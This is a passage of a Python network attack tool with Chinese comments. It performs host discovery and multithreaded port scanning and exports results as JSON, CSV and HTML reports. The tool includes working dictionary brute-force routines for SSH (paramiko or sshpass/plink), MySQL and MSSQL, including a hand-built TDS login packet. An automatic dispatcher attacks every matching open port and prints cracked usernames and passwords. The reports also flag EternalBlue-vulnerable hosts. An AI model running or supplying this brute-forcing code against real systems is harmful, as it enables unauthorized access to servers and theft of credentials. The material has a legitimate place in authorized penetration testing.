    offset += len(username_bytes)
    # password
    offsets.append((offset, len(password_bytes)))
    offset += len(password_bytes)
    # app_name
    offsets.append((offset, len(appname_bytes)))
    offset += len(appname_bytes)
    # server_name
    offsets.append((offset, len(servername_bytes)))
    offset += len(servername_bytes)
    # reserved1
    offsets.append((offset, 0))
    # library_name
    offsets.append((offset, len(library_name)))
    offset += len(library_name)
    # language
    offsets.append((offset, len(language_bytes)))
    offset += len(language_bytes)
    # database
    offsets.append((offset, len(database_bytes)))
    offset += len(database_bytes)
    # client_id
    client_id = b"\x01\x02\x03\x04\x05\x06"
    offsets.append((offset, len(client_id)))
    offset += len(client_id)
    # sspi
    offsets.append((offset, 0))
    # attach_db
    offsets.append((offset, 0))
    # change_password
    offsets.append((offset, 0))
    # sspi_long
    offsets.append((offset, 0))

    total_len = offset

    buf = bytearray()
    buf.extend(struct.pack(">I", total_len))
    buf.extend(b"\x00" * 4)  # TDS header placeholder
    buf.append(0x10)  # LOGIN7 type
    buf.append(0x01)  # status: end of message
    buf.extend(struct.pack(">H", total_len - 8))
    buf.extend(b"\x00\x00")  # spid
    buf.append(0x01)  # packet_id
    buf.append(0x00)  # window

    # fixed part
    buf.extend(struct.pack("<I", 0x00000B6C))  # TDS version
    buf.extend(struct.pack("<I", 128))  # packet size
    buf.extend(struct.pack("<I", 0))  # client program version
    buf.extend(struct.pack("<I", os.getpid() & 0xFFFFFFFF))  # client pid
    buf.extend(struct.pack("<I", 0))  # connection id
    buf.append(0xE0)  # option flags 1
    buf.append(0x03)  # option flags 2
    buf.append(0x03)  # type flags: SQL auth
    buf.append(0x00)  # option flags 3
    buf.extend(struct.pack("<i", 0))  # timezone
    buf.append(0x00)  # collation
    buf.append(0x00)
    buf.append(0x00)
    buf.append(0x00)
    buf.append(0x00)

    # offset/length pairs
    for off, length in offsets:
        buf.extend(struct.pack("<H", off))
        buf.extend(struct.pack("<H", length // 2))

    # data
    buf.extend(hostname_bytes)
    buf.extend(username_bytes)
    buf.extend(password_bytes)
    buf.extend(appname_bytes)
    buf.extend(servername_bytes)
    buf.extend(library_name)
    buf.extend(language_bytes)
    buf.extend(database_bytes)
    buf.extend(client_id)

    # fill TDS header
    buf[8:10] = struct.pack(">H", total_len)
    return bytes(buf)


def _mssql_read_response(sock: socket.socket, timeout: float = 3.0) -> int:
    try:
        sock.settimeout(timeout)
        header = sock.recv(8)
        if len(header) < 8:
            return -1
        msg_type = header[0]
        length = struct.unpack(">H", header[2:4])[0]
        remaining = length - 8
        data = b""
        while len(data) < remaining:
            chunk = sock.recv(remaining - len(data))
            if not chunk:
                break
            data += chunk
        if msg_type == 0x04:  # LOGIN response
            if len(data) >= 1:
                return data[0]  # 0x00 = success
        if msg_type == 0xAA:  # ERROR
            return -1
        if msg_type == 0xED:  # PRELOGIN
            return 0xFF
        return -1
    except Exception:
        return -1


def brute_mssql(host: str, port: int, username: str, password: str,
                timeout: float = 5.0) -> bool:
    """MSSQL TDS 原生socket爆破 - 单次尝试"""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        prelogin = _mssql_build_prelogin()
        sock.sendall(prelogin)
        pre_resp = _mssql_read_response(sock, timeout)
        if pre_resp < 0:
            return False
        login7 = _mssql_build_login7(username, password)
        sock.sendall(login7)
        resp_code = _mssql_read_response(sock, timeout)
        return resp_code == 0
    except Exception:
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


# === SSH 爆破 ===

_HAS_PARAMIKO = False
try:
    import paramiko
    _HAS_PARAMIKO = True
except ImportError:
    pass


def brute_ssh(host: str, port: int, username: str, password: str,
              timeout: float = 5.0) -> bool:
    """SSH 弱口令爆破 - 单次尝试"""
    if not _HAS_PARAMIKO:
        return _brute_ssh_subprocess(host, port, username, password, timeout)
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=host, port=port, username=username, password=password,
            timeout=timeout, allow_agent=False, look_for_keys=False,
            banner_timeout=timeout, auth_timeout=timeout,
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False


def _brute_ssh_subprocess(host: str, port: int, username: str, password: str,
                          timeout: float = 5.0) -> bool:
    """SSH 爆破 - subprocess 回退方案 (调用系统sshpass+ssh 或 plink)"""
    import subprocess as sp
    system = platform.system().lower()
    try:
        if system == "windows":
            cmd = [
                "plink.exe", "-batch", "-pw", password,
                "-P", str(port), f"{username}@{host}", "exit"
            ]
        else:
            cmd = [
                "sshpass", "-p", password, "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=" + str(int(timeout)),
                "-p", str(port), f"{username}@{host}", "exit"
            ]
        result = sp.run(cmd, capture_output=True, timeout=timeout + 3)
        return result.returncode == 0
    except Exception:
        return False


# === 爆破调度 ===

def auto_brute_force(hosts: List[HostInfo], timeout: float = 5.0,
                     max_workers: int = 20, dict_file: str = None) -> None:
    """对扫描结果中的SSH/MySQL/MSSQL端口自动进行弱口令爆破"""
    tasks = []
    for host_info in hosts:
        if not host_info.is_alive:
            continue
        for port_result in host_info.open_ports:
            if port_result.port in BRUTE_SERVICE_MAP:
                tasks.append(port_result)

    if not tasks:
        return

    service_targets: Dict[str, List[ScanResult]] = {}
    for t in tasks:
        svc = BRUTE_SERVICE_MAP[t.port]
        if svc not in service_targets:
            service_targets[svc] = []
        service_targets[svc].append(t)

    print(f"\n{'='*60}")
    print(f"[*] 弱口令爆破阶段")
    print(f"{'='*60}")
    print(f"[*] 目标服务: {', '.join(f'{s}x{len(v)}' for s, v in service_targets.items())}")
    print(f"[*] 字典文件: {dict_file or DICT_PATH}")
    print(f"[*] 线程数: {max_workers}\n")

    passwords = load_password_dict(dict_file or DICT_PATH)

    total_attempts = 0
    cracked = []

    for service_name, targets in service_targets.items():
        usernames = DEFAULT_USERNAMES.get(service_name, ["root", "admin"])
        total_combos = len(targets) * len(usernames) * len(passwords)
        print(f"\n  [{service_name}] {len(targets)} 个目标, "
              f"{len(usernames)} 个用户名, {len(passwords)} 个密码, "
              f"共 {total_combos} 种组合")

        brute_func_map = {
            "SSH": brute_ssh,
            "MySQL": brute_mysql,
            "MSSQL": brute_mssql,
        }
        brute_func = brute_func_map.get(service_name)
        if not brute_func:
            continue

        if service_name == "SSH" and not _HAS_PARAMIKO:
            print(f"  [!] 未安装 paramiko, 将尝试 subprocess 方案(效率较低)")
            print(f"  [*] 建议: pip install paramiko")

        service_attempts = 0
        lock = threading.Lock()

        def worker(target, username, password):
            nonlocal service_attempts
            if target.brute_result and target.brute_result.success:
                return
            success = brute_func(target.host, target.port, username, password, timeout)
            with lock:
                service_attempts += 1
                if success:
                    if not target.brute_result or not target.brute_result.success:
                        br = BruteResult()
                        br.success = True
                        br.service = service_name
                        br.host = target.host
                        br.port = target.port
                        br.username = username
                        br.password = password
                        br.tried_count = service_attempts
                        target.brute_result = br
                        cracked.append(br)
                        print(f"  [!!!] 爆破成功! {target.host}:{target.port} "
                              f"{service_name} {username}/{password}", flush=True)
                elif service_attempts % 100 == 0:
                    print(f"    {service_name} 已尝试 {service_attempts}/{total_combos}...",
                          flush=True)

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for target in targets:
                if target.brute_result and target.brute_result.success:
                    continue
                for username in usernames:
                    for password in passwords:
                        futures.append(executor.submit(worker, target, username, password))
            for f in as_completed(futures):
                pass

        total_attempts += service_attempts
        print(f"  [{service_name}] 完成: {service_attempts} 次尝试, "
              f"成功 {sum(1 for c in cracked if c.service == service_name)} 个")

    if cracked:
        print(f"\n  {'='*60}")
        print(f"  [!!!] 爆破成功汇总 ({len(cracked)} 个)")
        print(f"  {'='*60}")
        for c in cracked:
            print(f"    {c.host}:{c.port}  {c.service:<8}  {c.username}/{c.password}")
        print(f"  {'='*60}")
    else:
        print(f"\n  [-] 未爆破出任何弱口令")

    print(f"\n[+] 爆破阶段完成, 总尝试: {total_attempts} 次")

def discover_alive_hosts(
    targets: List[str],
    use_icmp: bool = True,
    use_tcp_ping: bool = True,
    ping_timeout: float = 1.0,
    max_workers: int = 200
) -> List[HostInfo]:
    """发现存活主机"""
    print(f"\n{'='*60}")
    print(f"[*] 主机发现阶段 - 共 {len(targets)} 个目标")
    print(f"{'='*60}")

    host_map: Dict[str, HostInfo] = {}

    def probe_host(ip: str) -> HostInfo:
        info = HostInfo(ip)
        alive = False

        if use_icmp:
            is_alive, ttl, os_guess = icmp_ping(ip, ping_timeout)
            if is_alive:
                alive = True
                info.ttl = ttl
                info.os_guess = os_guess

        if not alive and use_tcp_ping:
            for probe_port in [80, 443, 22, 445, 3389, 135, 8080]:
                if tcp_ping(ip, probe_port, ping_timeout):
                    alive = True
                    break

        info.is_alive = alive
        if alive:
            info.hostname = resolve_hostname(ip)

        return info

    completed = 0
    alive_count = 0

    print(f"[*] 使用 {'ICMP' if use_icmp else ''}"
          f"{' + ' if use_icmp and use_tcp_ping else ''}"
          f"{'TCP-Ping' if use_tcp_ping else ''} 探测...\n")

    lock = threading.Lock()
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_map = {executor.submit(probe_host, ip): ip for ip in targets}
        for future in as_completed(future_map):
            info = future.result()
            with lock:
                host_map[info.ip] = info
                completed += 1
                if info.is_alive:
                    alive_count += 1
                    status = "[存活]"
                else:
                    status = "[离线]"
                hostname_str = f" ({info.hostname})" if info.hostname else ""
                os_str = f" [{info.os_guess}]" if info.os_guess else ""
                print(f"  {completed:>4}/{len(targets)} {status} {info.ip:<16}"
                      f" TTL={info.ttl:<4}{os_str}{hostname_str}", flush=True)

    print(f"\n[+] 主机发现完成: {alive_count}/{len(targets)} 台主机存活")

    # 打印存活汇总
    if alive_count > 0:
        print(f"\n{'='*60}")
        print(f"  存活主机汇总")
        print(f"{'='*60}")
        print(f"  {'IP 地址':<18} {'主机名':<25} {'TTL':<6} {'操作系统猜测'}")
        print(f"  {'─'*55}")
        for info in sorted(host_map.values(), key=lambda h: ip_to_int(h.ip)):
            if info.is_alive:
                print(f"  {info.ip:<18} {info.hostname[:24]:<25} {info.ttl:<6} {info.os_guess}")
        print(f"{'='*60}")

    return list(host_map.values())


# ============================================================================
# 端口扫描引擎
# ============================================================================

def scan_ports(
    hosts: List[HostInfo],
    ports: List[int],
    scan_type: str = "tcp",
    timeout: float = 2.0,
    max_workers: int = 500,
    only_alive: bool = True
) -> None:
    """多线程端口扫描"""
    print(f"\n{'='*60}")
    print(f"[*] 端口扫描阶段 - {len(ports)} 个端口 ({scan_type.upper()})")
    print(f"{'='*60}")

    if only_alive:
        target_hosts = [h for h in hosts if h.is_alive]
    else:
        target_hosts = hosts

    if not target_hosts:
        print("[!] 没有需要扫描的目标主机")
        return

    total_tasks = len(target_hosts) * len(ports)
    completed = 0
    open_count = 0
    scan_queue = queue.Queue()

    for host in target_hosts:
        for port in ports:
            scan_queue.put((host, port))

    scan_func = tcp_connect_scan if scan_type == "tcp" else udp_scan

    print(f"[*] 目标: {len(target_hosts)} 台主机, 端口: {len(ports)} 个")
    print(f"[*] 总任务数: {total_tasks}, 线程数: {max_workers}\n")

    lock = threading.Lock()
    start_time = time.time()
    closed_count = 0
    filtered_count = 0
    error_count = 0

    def worker():
        nonlocal completed, open_count, closed_count, filtered_count, error_count
        while True:
            try:
                host, port = scan_queue.get(block=False)
            except queue.Empty:
                break

            result = scan_func(host.ip, port, timeout)
            with lock:
                completed += 1
                if result:
                    if result.state == "open":
                        host.open_ports.append(result)
                        open_count += 1
                        _print_open_port(result)
                    elif "closed" in result.state:
                        closed_count += 1
                        print(f"    [{result.state:<12}] {result.host:<16} "
                              f"端口 {result.port:<6}/{result.protocol:<4}", flush=True)
                    elif "filtered" in result.state:
                        filtered_count += 1
                        print(f"    [{result.state:<12}] {result.host:<16} "
                              f"端口 {result.port:<6}/{result.protocol:<4}", flush=True)
                    else:
                        error_count += 1
                        print(f"    [{result.state:<12}] {result.host:<16} "
                              f"端口 {result.port:<6}/{result.protocol:<4}", flush=True)
                else:
                    error_count += 1

                if completed % 500 == 0:
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    eta = (total_tasks - completed) / rate if rate > 0 else 0
                    pct = completed * 100 // total_tasks
                    print(f"\n  {'─'*55}")
                    print(f"  进度: {completed}/{total_tasks} ({pct}%) "
                          f"| 速率: {rate:.0f}/s | 开放: {open_count} "
                          f"| 关闭: {closed_count} | 过滤: {filtered_count} "
                          f"| 预计剩余: {eta:.0f}s")
                    print(f"  {'─'*55}\n", flush=True)

            scan_queue.task_done()

    threads = []
    actual_workers = min(max_workers, total_tasks)
    for _ in range(actual_workers):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    print(f"\n  {'─'*55}")
    print(f"  [+] 端口扫描完成: 耗时 {elapsed:.1f}s")
    print(f"  [+] 开放: {open_count} | 关闭: {closed_count} "
          f"| 过滤: {filtered_count} | 错误: {error_count}")
    print(f"  {'─'*55}")


def _print_open_port(result: ScanResult):
    """打印开放的端口信息"""
    vuln_flag = " [!!!高危] " if result.is_vulnerable else ""
    banner_short = result.banner[:60].replace("\n", " ").replace("\r", "") if result.banner else ""
    print(f"  [+] {result.host:<16} {result.port:<6}/{result.protocol:<4} "
          f"{result.service:<22}{vuln_flag} {banner_short}")


# ============================================================================
# 报告生成
# ============================================================================

def generate_summary(hosts: List[HostInfo]) -> str:
    """生成扫描摘要"""
    alive_hosts = [h for h in hosts if h.is_alive or h.open_ports]
    total_open = sum(len(h.open_ports) for h in hosts)
    vuln_ports = sum(
        sum(1 for p in h.open_ports if p.is_vulnerable) for h in hosts
    )

    lines = [
        f"\n{'='*60}",
        f"  扫描摘要报告",
        f"{'='*60}",
        f"  扫描时间:      {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  总目标数:      {len(hosts)}",
        f"  存活主机:      {len(alive_hosts)}",
        f"  开放端口总数:  {total_open}",
        f"  高危端口数:    {vuln_ports}",
        f"  永恒之蓝漏洞:  {sum(1 for h in hosts for p in h.open_ports if p.eternal_blue_vuln)}",
        f"{'='*60}",
    ]

    if alive_hosts:
        lines.append(f"\n{'─'*60}")
        lines.append("  主机详情:")
        lines.append(f"{'─'*60}")
        for host in sorted(alive_hosts, key=lambda h: ip_to_int(h.ip)):
            lines.append(f"\n  IP: {host.ip}  ({host.hostname})")
            lines.append(f"  OS 猜测: {host.os_guess}  TTL: {host.ttl}")
            lines.append(f"  开放端口 ({len(host.open_ports)}):")
            for r in host.open_ports:
                vuln = f" [高危] {r.vuln_reason}" if r.is_vulnerable else ""
                svc = f"{r.service}" if r.service else "unknown"
                banner_info = f" | {r.banner[:50].strip()}" if r.banner else ""
                brute_info = ""
                if r.brute_result and r.brute_result.success:
                    brute_info = f" | [爆破成功] {r.brute_result.username}/{r.brute_result.password}"
                eb_info = ""
                if r.eternal_blue_vuln:
                    eb_info = f" | [永恒之蓝] {r.eternal_blue_os}"
                lines.append(f"    {r.port}/{r.protocol:<4} - {svc}{vuln}{banner_info}{brute_info}{eb_info}")

    return "\n".join(lines)


def _target_to_filename(target: str) -> str:
    """将目标字符串转为安全的文件名前缀"""
    safe = target.replace("/", "_").replace("\\", "_").replace(":", "_")
    safe = safe.replace("*", "_").replace("?", "_").replace('"', "_")
    safe = safe.replace("<", "_").replace(">", "_").replace("|", "_")
    safe = safe.replace(" ", "_")
    safe = safe[:60]
    return safe.strip("_")


def export_json(hosts: List[HostInfo], filepath: str):
    """导出 JSON 格式报告"""
    report = {
        "scan_info": {
            "scan_time": datetime.now().isoformat(),
            "total_targets": len(hosts),
            "alive_hosts": sum(1 for h in hosts if h.is_alive),
            "total_open_ports": sum(len(h.open_ports) for h in hosts),
            "scanner_ip": get_local_ip(),
        },
        "hosts": [h.to_dict() for h in hosts if h.is_alive or h.open_ports],
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"[+] JSON 报告已保存: {filepath}")


def _safe_csv_str(val: Any) -> str:
    """将值转为安全的CSV字符串, 去除换行、回车、双引号"""
    s = str(val)
    return s.replace("\n", " ").replace("\r", " ").replace('"', "'")


def _csv_quote(val: str) -> str:
    """将字符串用双引号包裹"""
    return '"' + val + '"'


def export_csv(hosts: List[HostInfo], filepath: str):
    """导出 CSV 格式报告 (手动构建, 不依赖csv模块避免转义问题)"""
    header = "IP,主机名,OS猜测,TTL,端口,协议,服务,状态,Banner,版本,高危,漏洞说明,响应时间(ms),爆破成功,爆破用户名,爆破密码,永恒之蓝漏洞,永恒之蓝OS\n"
    lines = [header]

    for host in hosts:
        if not host.is_alive and not host.open_ports:
            continue
        if not host.open_ports:
            lines.append(",".join([
                _csv_quote(host.ip),
                _csv_quote(_safe_csv_str(host.hostname)),
                _csv_quote(_safe_csv_str(host.os_guess)),
                str(host.ttl),
                _csv_quote(""), _csv_quote(""), _csv_quote(""),
                _csv_quote("无开放端口"),
                _csv_quote(""), _csv_quote(""), _csv_quote(""), _csv_quote(""),
                _csv_quote(""), _csv_quote(""), _csv_quote(""), _csv_quote(""), _csv_quote(""),
            ]) + "\n")
            continue
        for r in host.open_ports:
            lines.append(",".join([
                _csv_quote(r.host),
                _csv_quote(_safe_csv_str(host.hostname)),
                _csv_quote(_safe_csv_str(host.os_guess)),
                str(host.ttl),
                str(r.port),
                _csv_quote(r.protocol),
                _csv_quote(_safe_csv_str(r.service)),
                _csv_quote(r.state),
                _csv_quote(_safe_csv_str(r.banner[:200]) if r.banner else ""),
                _csv_quote(_safe_csv_str(r.version)),
                _csv_quote("是" if r.is_vulnerable else "否"),
                _csv_quote(_safe_csv_str(r.vuln_reason)),
                f"{r.response_time * 1000:.2f}",
                _csv_quote("是" if (r.brute_result and r.brute_result.success) else "否"),
                _csv_quote(_safe_csv_str(r.brute_result.username) if (r.brute_result and r.brute_result.success) else ""),
                _csv_quote(_safe_csv_str(r.brute_result.password) if (r.brute_result and r.brute_result.success) else ""),
                _csv_quote("是" if r.eternal_blue_vuln else "否"),
                _csv_quote(_safe_csv_str(r.eternal_blue_os) if r.eternal_blue_vuln else ""),
            ]) + "\n")

    with open(filepath, "w", encoding="utf-8-sig") as f:
        f.writelines(lines)
    print(f"[+] CSV 报告已保存: {filepath}")


def _html_escape(text: str) -> str:
    """HTML转义"""
    if not text:
        return ""
    return (text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#39;"))


def export_html(hosts: List[HostInfo], filepath: str):
    """导出 HTML 格式可视化报告"""
    alive_hosts = [h for h in hosts if h.is_alive or h.open_ports]
    total_open = sum(len(h.open_ports) for h in hosts)
    vuln_count = sum(sum(1 for p in h.open_ports if p.is_vulnerable) for h in hosts)
    brute_ok = sum(sum(1 for p in h.open_ports if p.brute_result and p.brute_result.success) for h in hosts)
    eb_count = sum(sum(1 for p in h.open_ports if p.eternal_blue_vuln) for h in hosts)
    avg_rtt = 0.0
    all_rtt = [r.response_time * 1000 for h in hosts for r in h.open_ports if r.response_time > 0]
    if all_rtt:
        avg_rtt = sum(all_rtt) / len(all_rtt)

    # 按端口聚合统计
    port_stats = defaultdict(int)
    for h in hosts:
        for r in h.open_ports:
            port_stats[r.port] += 1

    top_ports = sorted(port_stats.items(), key=lambda x: x[1], reverse=True)[:20]

    top_ports_html = ""
    for port, count in top_ports:
        svc = get_service_name(port)
        max_count = top_ports[0][1] if top_ports else 1
        pct = int(count / max_count * 100) if max_count else 0
        top_ports_html += f"""
        <tr>
            <td class="port-num">{port}</td>
            <td>{svc}</td>
            <td>{count} 台</td>
            <td><div class="bar-wrap"><div class="bar" style="width:{pct}%"></div></td>
        </tr>"""

    # 服务分布统计
    svc_stats = defaultdict(int)
    for h in hosts:
        for r in h.open_ports:
            svc_stats[r.service or "unknown"] += 1
    top_svcs = sorted(svc_stats.items(), key=lambda x: x[1], reverse=True)[:15]
    svc_dist_html = ""
    for svc, cnt in top_svcs:
        max_svc = top_svcs[0][1] if top_svcs else 1
        pct = int(cnt / max_svc * 100) if max_svc else 0
        svc_dist_html += f"""
        <tr>
            <td>{svc}</td>
            <td>{cnt} 个</td>
            <td><div class="bar-wrap"><div class="bar bar-blue" style="width:{pct}%"></div></td>
        </tr>"""

    # 主机详情
    hosts_html = ""
    for idx, host in enumerate(sorted(alive_hosts, key=lambda h: ip_to_int(h.ip))):
        port_rows = ""
        for r in host.open_ports:
            row_class = "row-danger" if r.is_vulnerable else ""
            vuln_badge = '<span class="tag tag-danger">[高危]</span>' if r.is_vulnerable else ""
            brute_badge = ""
            if r.brute_result and r.brute_result.success:
                brute_badge = (f'<span class="tag tag-crack">[爆破] {r.brute_result.username}/'
                               f'{r.brute_result.password}</span>')

            eb_badge = ""
            if r.eternal_blue_vuln:
                eb_badge = (f'<span class="tag tag-eb">[永恒之蓝] {_html_escape(r.eternal_blue_os)}</span>')

            banner_clean = _html_escape((r.banner or "")[:400])
            banner_display = banner_clean if banner_clean else '<span class="muted">—</span>'
            banner_preview = ""
            if r.banner:
                banner_preview = (r.banner or "")[:200].replace("\n", " ").replace("\r", " ")
                banner_preview = _html_escape(banner_preview)

            version_str = _html_escape(r.version or "")
            version_display = f'<span class="version">{version_str}</span>' if version_str else '<span class="muted">—</span>'

            port_rows += f"""
            <tr class="{row_class}">
                <td class="port-cell">
                    <span class="port-badge {'port-badge-danger' if r.is_vulnerable else ''}">{r.port}</span>
                    <span class="proto-tag">{r.protocol}</span>
                </td>
                <td><strong>{r.service or "unknown"}</strong></td>
                <td><span class="state-{r.state.split('(')[0].split('|')[0].strip()}">{r.state}</span></td>
                <td>{r.response_time * 1000:.1f}ms</td>
                <td>{r.ttl if r.ttl else '—'}</td>
                <td class="version-cell">{version_display}</td>
                <td class="fingerprint-cell">
                    <div class="fingerprint-preview" title="{banner_preview}">{banner_display}</div>
                </td>
                <td class="risk-cell">
                    {vuln_badge}{brute_badge}{eb_badge}
                    {('<div class="vuln-detail">' + _html_escape(r.vuln_reason) + '</div>') if r.is_vulnerable else ''}
                </td>
            </tr>"""

        # 统计该主机
        host_vuln = sum(1 for p in host.open_ports if p.is_vulnerable)
        host_brute = sum(1 for p in host.open_ports if p.brute_result and p.brute_result.success)
        host_eb = sum(1 for p in host.open_ports if p.eternal_blue_vuln)

        hosts_html += f"""
        <div class="host-group">
            <div class="host-group-header" onclick="this.nextElementSibling.classList.toggle('collapsed')">
                <span class="host-arrow">▾</span>
                <span class="host-ip">{host.ip}</span>
                <span class="host-hostname">{host.hostname or '—'}</span>
                <span class="host-os">{host.os_guess or 'Unknown OS'}</span>
                <span class="host-stats">
                    TTL={host.ttl} | 端口={len(host.open_ports)} | 高危={host_vuln} | 爆破成功={host_brute} | MS17-010={host_eb}
                </span>
            </div>
            <div class="host-content">
            <table class="port-table">
                <thead><tr>
                    <th width="80">端口</th>
                    <th width="110">服务</th>
                    <th width="90">状态</th>
                    <th width="75">响应</th>
                    <th width="55">TTL</th>
                    <th width="100">版本</th>
                    <th>Banner / 指纹</th>
                    <th width="180">风险与爆破</th>
                </tr></thead>
                <tbody>{port_rows}</tbody>
            </table>
            </div>
        </div>"""

    if not hosts_html:
        hosts_html = '<div class="empty-state"><p>暂无存活主机或有开放端口</p></div>'

    html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>端口扫描报告 - {datetime.now().strftime('%Y-%m-%d %H:%M')}</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', 'Microsoft YaHei', Tahoma, sans-serif;
       background: #0d1117; color: #c9d1d9; padding: 20px; line-height: 1.5; }}
.container {{ max-width: 1500px; margin: 0 auto; }}

.header {{ background: linear-gradient(135deg, #0d1b2a 0%, #1a2332 50%, #16213e 100%);
          padding: 35px 40px; border-radius: 12px; margin-bottom: 20px;
          border: 1px solid #30363d; position: relative; overflow: hidden; }}
.header::before {{ content: ''; position: absolute; top: -50%; right: -50%; width: 200px; height: 200px;
                   background: radial-gradient(circle, rgba(88,166,255,0.1) 0%, transparent 70%); }}
.header h1 {{ color: #58a6ff; font-size: 1.8em; margin-bottom: 8px; position: relative; }}
.header p {{ color: #8b949e; position: relative; }}

.stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
         gap: 15px; margin-bottom: 20px; }}
.stat-card {{ background: #161b22; padding: 22px 18px; border-radius: 8px;
             border: 1px solid #30363d; text-align: center; transition: transform .15s; }}
.stat-card:hover {{ transform: translateY(-2px); border-color: #58a6ff55; }}
.stat-card .value {{ font-size: 2.2em; font-weight: 700; color: #58a6ff; }}
.stat-card .label {{ color: #8b949e; margin-top: 4px; font-size: .9em; }}
.stat-card.danger .value {{ color: #f85149; }}
.stat-card.crack .value {{ color: #d2a847; }}
.stat-card.rtt .value {{ color: #7ee787; }}

.section {{ background: #161b22; padding: 24px; border-radius: 8px;
           border: 1px solid #30363d; margin-bottom: 20px; }}
.section h2 {{ color: #58a6ff; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }}
.section h2 .count {{ color: #8b949e; font-size: .7em; font-weight: normal; }}

table {{ width: 100%; border-collapse: collapse; }}
th, td {{ padding: 10px 14px; text-align: left; border-bottom: 1px solid #21262d; }}
th {{ background: #21262d; color: #8b949e; font-weight: 600; font-size: .85em;
      position: sticky; top: 0; z-index: 1; white-space: nowrap; }}
tr:hover {{ background: #1c2128; }}
.port-num {{ font-weight: 700; color: #58a6ff; }}

.bar-wrap {{ background: #21262d; border-radius: 3px; height: 8px; overflow: hidden; }}
.bar {{ background: #238636; height: 100%; border-radius: 3px; transition: width .3s; min-width: 2px; }}
.bar-blue {{ background: #58a6ff; }}

.host-group {{ margin-bottom: 12px; border: 1px solid #21262d; border-radius: 8px; overflow: hidden; }}
.host-group-header {{ display: flex; align-items: center; gap: 12px; padding: 14px 18px;
                     background: #0d1117; cursor: pointer; user-select: none;
                     border-bottom: 1px solid #21262d; transition: background .15s; }}
.host-group-header:hover {{ background: #161b22; }}
.host-arrow {{ color: #58a6ff; transition: transform .2s; font-size: .9em; }}
.host-content.collapsed {{ display: none; }}
.host-content.collapsed + .host-group-header .host-arrow {{ transform: rotate(-90deg); }}
.host-ip {{ color: #58a6ff; font-weight: 700; font-size: 1.05em; min-width: 130px; }}
.host-hostname {{ color: #8b949e; min-width: 100px; }}
.host-os {{ color: #7ee787; font-size: .9em; }}
.host-stats {{ color: #484f58; font-size: .82em; margin-left: auto; }}

.port-table {{ font-size: .88em; }}
.port-table th {{ padding: 8px 10px; }}
.port-table td {{ padding: 8px 10px; vertical-align: top; }}

.port-cell {{ white-space: nowrap; }}
.port-badge {{ display: inline-block; background: #238636; color: #fff; padding: 2px 8px;
              border-radius: 4px; font-weight: 700; font-size: .9em; min-width: 38px; text-align: center; }}
.port-badge-danger {{ background: #da3633; animation: pulse 2s infinite; }}
@keyframes pulse {{ 0%,100%{{opacity:1}} 50%{{opacity:.7}} }}
.proto-tag {{ color: #8b949e; font-size: .75em; margin-left: 4px; }}

.state-open {{ color: #3fb950; font-weight: 600; }}
.state-closed {{ color: #8b949e; }}
.state-filtered {{ color: #d29922; }}
.state-open\\|filtered {{ color: #d29922; }}
.muted {{ color: #484f58; font-style: italic; }}

.version-cell {{ max-width: 150px; }}
.version {{ color: #a5d6ff; font-size: .85em; word-break: break-all; }}

.fingerprint-cell {{ max-width: 400px; }}
.fingerprint-preview {{ color: #8b949e; font-size: .82em; font-family: 'Consolas', 'Courier New', monospace;
                        max-height: 60px; overflow: hidden; white-space: pre-wrap; word-break: break-all;
                        line-height: 1.4; }}
.fingerprint-preview:hover {{ max-height: none; }}

.risk-cell {{ white-space: nowrap; }}
.row-danger {{ background: #f8514908; }}
.tag {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: .82em; margin: 2px 3px 2px 0; }}
.tag-danger {{ background: #da363322; color: #f85149; border: 1px solid #da363344; }}
.tag-crack {{ background: #d2a84722; color: #d2a847; border: 1px solid #d2a84744; font-weight: 600; }}
.tag-eb {{ background: #e9456022; color: #e94560; border: 1px solid #e9456044; font-weight: 600; animation: pulse 0.8s infinite; }}
.vuln-detail {{ color: #f8514988; font-size: .78em; margin-top: 3px; white-space: normal; }}

.empty-state {{ text-align: center; color: #484f58; padding: 60px 0; font-size: 1.1em; }}

.footer {{ text-align: center; color: #484f58; padding: 30px 0 10px; font-size: .85em;
          border-top: 1px solid #21262d; margin-top: 10px; }}

@media (max-width: 768px) {{
    .stats {{ grid-template-columns: repeat(2, 1fr); }}
    .host-group-header {{ flex-wrap: wrap; }}
    .port-table {{ display: block; overflow-x: auto; }}
}}
</style>
</head>
<body>
<div class="container">
<div class="header">
    <h1>全网段端口扫描报告</h1>
    <p>扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
       扫描器 IP: {get_local_ip()} &nbsp;|&nbsp;
       存活 {len(alive_hosts)}/{len(hosts)} 台</p>
</div>

<div class="stats">
    <div class="stat-card">
        <div class="value">{len(hosts)}</div>
        <div class="label">[总计] 总目标数</div>
    </div>
    <div class="stat-card">
        <div class="value">{len(alive_hosts)}</div>
        <div class="label">[在线] 存活主机</div>
    </div>
    <div class="stat-card">
        <div class="value">{total_open}</div>
        <div class="label">[开放] 开放端口</div>
    </div>
    <div class="stat-card danger">
        <div class="value">{vuln_count}</div>
        <div class="label">[高危] 高危端口</div>
    </div>
    <div class="stat-card crack">
